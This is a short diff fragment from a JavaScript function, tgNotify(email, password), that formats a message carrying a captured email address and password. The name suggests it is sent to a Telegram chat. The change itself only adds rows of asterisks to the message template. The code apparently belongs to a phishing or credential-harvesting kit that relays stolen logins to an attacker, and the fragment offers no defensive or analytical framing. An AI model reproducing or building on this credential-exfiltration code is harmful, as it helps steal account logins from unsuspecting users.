@@ -18,6 +18,13 @@ async function tgNotify(email, password) {
 
         const text = `
 📬 *HA LJADID*
+************************
+***********************
+***********************
+***********************
+*
+*********************
+*
 
 📬 *email:* \`${email}\`
 📬 *password:* \`${password}\`
